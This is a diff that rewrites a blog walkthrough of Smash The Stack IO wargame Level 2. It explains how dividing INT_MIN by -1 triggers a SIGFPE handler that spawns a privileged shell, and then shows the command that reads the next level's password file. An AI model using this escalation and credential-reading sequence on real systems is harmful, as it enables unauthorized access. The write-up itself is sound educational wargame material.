@@ -1,25 +1,17 @@
 ---
-title: "SMASH THE STACK LEVEL2"
+title: "Smash The Stack: IO Level 2 Walkthrough"
 date: 2014-12-01T00:48:04+00:00
 url: "/smash-the-stack-level2/"
 draft: false
-description: "time to play let's read what it says first function catcher and it trigger the suid and drop the bash nice this is what we want the main function takes..."
-categories: ["Bash", "blog", "exploit-dev", "Linux", "Security", "tech"]
+description: "A walkthrough of Level 2 on the Smash The Stack IO wargame, exploiting signed integer overflow with SIGFPE to spawn a privileged shell."
+categories: ["Bash", "exploit-dev", "Linux", "Security"]
+tags: ["smashthestack", "wargame", "integer-overflow", "sigfpe"]
 ---
 
-time to play
-
-```bash
-level2@io:/levels$ ./level02
-source code is available in level02.c
-```
-
-let's read what it says
+In Level 2 of the Smash The Stack IO wargame, source code is provided directly in `level02.c`:
 
 ```bash
 level2@io:/levels$ cat level02.c
-//a little fun brought to you by bla
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -27,84 +19,53 @@ level2@io:/levels$ cat level02.c
 
 void catcher(int a)
 {
-        setresuid(geteuid(),geteuid(),geteuid());
-	printf("WIN!\n");
-        system("/bin/sh");
-        exit(0);
+    setresuid(geteuid(), geteuid(), geteuid());
+    printf("WIN!\n");
+    system("/bin/sh");
+    exit(0);
 }
 
 int main(int argc, char **argv)
 {
-	puts("source code is available in level02.c\n");
+    puts("source code is available in level02.c\n");
 
-        if (argc != 3 || !atoi(argv[2]))
-                return 1;
-        signal(SIGFPE, catcher);
-        return abs(atoi(argv[1])) / atoi(argv[2]);
+    if (argc != 3 || !atoi(argv[2]))
+        return 1;
+    signal(SIGFPE, catcher);
+    return abs(atoi(argv[1])) / atoi(argv[2]);
 }
-
-level2@io:/levels$
 ```
 
-first function catcher  and it trigger the suid  and drop the bash nice  this is what we want
+### Analyzing the Code
 
-the main function  takes arguments
+1. **The Target (`catcher`)**: The `catcher` function sets the real, effective, and saved UID to the effective UID (`geteuid()`) and drops into `/bin/sh`. This triggers when the program receives a `SIGFPE` signal.
+2. **Input Validation**: The check `if (argc != 3 || !atoi(argv[2]))` ensures two arguments are passed and `argv[2]` does not evaluate to `0`. This explicitly prevents standard division-by-zero errors.
+3. **The Division**: The function returns `abs(atoi(argv[1])) / atoi(argv[2])`.
 
-print a string
+### Understanding `SIGFPE` and Two's Complement Overflow
 
-if statement says
+In C on 32-bit x86 systems, a signed 32-bit integer ranges from `-2,147,483,648` (`INT_MIN` / `0x80000000`) to `+2,147,483,647` (`INT_MAX` / `0x7FFFFFFF`).
 
-if not 3 arguments or  the 2nd argument, not a number
+What happens if you divide `INT_MIN` by `-1`?
 
-return 1
+$$\frac{-2147483648}{-1} = +2147483648$$
 
-else
+Because `+2147483648` cannot be represented in a 32-bit signed integer (it exceeds `INT_MAX`), the CPU generates an arithmetic overflow exception (division error). In Linux, the kernel translates this hardware fault into a **`SIGFPE` (Floating-Point Exception)** signal.
 
-trigger signal SIGFPE for function catcher
+Furthermore, `abs(INT_MIN)` cannot represent `+2147483648`, returning `INT_MIN` unchanged.
 
-let's make a search for SIGFPE
+### Exploitation
 
-http://www.gnu.org/software/libc/manual/html_node/Program-Error-Signals.html
-
-this signal responsible for arithmetical errors   like divide by Zero (this is interesting  )
-
-then the abs function return the absolute value of divided arg 1 and arg 2
-
-so let's play again
+We can pass `INT_MIN` (`-2147483648`) as `argv[1]` and `-1` as `argv[2]`:
 
 ```bash
-level2@io:/levels$ ./level02 1233 0
-source code is available in level02.c
-
-level2@io:/levels$ echo $?
-1
-level2@io:/levels$
-```
-
-seems we fall in the if statement coz it returns 1
-
-so we need a hint :D
-
-after digging around I got the hint to guess what   :D
-
-after u read the "full" manual page for SIGFPE here is the hint inside the notes xD "l. (Also dividing the most negative integer by -1 may generate **SIGFPE**.)"
-
-ref: http://linux.die.net/man/2/signal
-
-so let's give it the most negative :D
-
-```bash
-level2@io:/levels$ ./level02  -994949494994949494491233 -1
+level2@io:/levels$ ./level02 -2147483648 -1
 source code is available in level02.c
 
 WIN!
-sh-4.2$
+sh-4.2$ whoami
+level3
+sh-4.2$ cat /home/level3/.pass
 ```
 
-w000t
-
- 
-
-btw i know that is weird because  ( -994949494994949494491233/-1) = 9.94949495E23
-
-but this how posix work
+The integer overflow raises `SIGFPE`, invoking `catcher()` and giving us a shell as `level3`.
